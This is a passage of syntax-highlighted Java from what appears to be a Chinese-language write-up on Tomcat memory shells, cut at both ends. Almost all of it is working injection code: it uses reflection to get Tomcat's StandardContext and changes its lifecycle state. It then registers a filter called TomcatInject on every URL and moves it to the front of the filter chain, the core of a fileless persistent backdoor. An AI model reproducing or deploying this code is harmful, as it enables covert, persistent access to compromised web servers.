&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ThreadLocal&lt;/span>&lt;span style="color:#f92672">());&lt;/span> &lt;span style="color:#75715e">//设置ThreadLocal对象
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 初始化lastServicedResponse
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;lastServicedResponse&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">modifiersField&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;modifiers&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">modifiersField&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">modifiersField&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setInt&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getModifiers&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#f92672">~&lt;/span>&lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">lang&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">reflect&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Modifier&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">FINAL&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ThreadLocal&lt;/span>&lt;span style="color:#f92672">());&lt;/span> &lt;span style="color:#75715e">// 设置ThreadLocal对象
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 获取上下文StandardContext
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">ServletContext&lt;/span> &lt;span style="color:#111">servletContext&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">getServletContext&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">servletContext&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">ctx&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">servletContext&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;context&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ApplicationContext&lt;/span> &lt;span style="color:#111">appctx&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ApplicationContext&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">servletContext&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">stdctx&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">appctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;context&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">stdctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">StandardContext&lt;/span> &lt;span style="color:#111">standardContext&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">StandardContext&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">stdctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">appctx&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">standardContext&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 这样设置不会抛出报错
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">stateField&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">org&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">apache&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">catalina&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">util&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">LifecycleBase&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;state&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">stateField&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">stateField&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">standardContext&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">LifecycleState&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">STARTING_PREP&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Filter&lt;/span> &lt;span style="color:#111">myFilter&lt;/span> &lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TomcatInject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 调用doFilter来动态添加Filter 也可以利用反射
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">javax&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">servlet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">FilterRegistration&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Dynamic&lt;/span> &lt;span style="color:#111">filterRegistration&lt;/span> &lt;span style="color:#f92672">=&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">servletContext&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">addFilter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">filterName&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">myFilter&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 进行一些简单的设置
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">filterRegistration&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setInitParameter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;encoding&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;utf-8&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">filterRegistration&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAsyncSupported&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 设置基本的 url pattern
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">filterRegistration&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">addMappingForUrlPatterns&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">util&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">EnumSet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">of&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">javax&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">servlet&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">DispatcherType&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">REQUEST&lt;/span>&lt;span style="color:#f92672">),&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#d88200">&amp;#34;/*&amp;#34;&lt;/span>&lt;span style="color:#f92672">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 将服务重新修改回来，不然的话服务会无法正常进行
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">stateField&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">stateField&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">standardContext&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">org&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">apache&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">catalina&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">LifecycleState&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">STARTED&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 设置好之后调用filterstart来启动我们的 filter
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">standardContext&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">filterStartMethod&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">StandardContext&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;filterStart&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">filterStartMethod&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">filterStartMethod&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">standardContext&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 把filter插到第一位
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">ccc&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ccc&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;org.apache.tomcat.util.descriptor.web.FilterMap&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Throwable&lt;/span> &lt;span style="color:#111">t&lt;/span>&lt;span style="color:#f92672">){}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ccc&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ccc&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;org.apache.catalina.deploy.FilterMap&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Throwable&lt;/span> &lt;span style="color:#111">t&lt;/span>&lt;span style="color:#f92672">){}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">forName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;org.apache.catalina.core.StandardContext&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;findFilterMaps&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">filterMaps&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[])&lt;/span> &lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">standardContext&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">tmpFilterMaps&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">filterMaps&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">index&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">filterMaps&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">++)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Object&lt;/span> &lt;span style="color:#111">o&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">filterMaps&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ccc&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getFilterName&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">o&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">equalsIgnoreCase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">filterName&lt;/span>&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">tmpFilterMaps&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">o&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">tmpFilterMaps&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">index&lt;/span>&lt;span style="color:#f92672">++]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">filterMaps&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">filterMaps&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">++)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
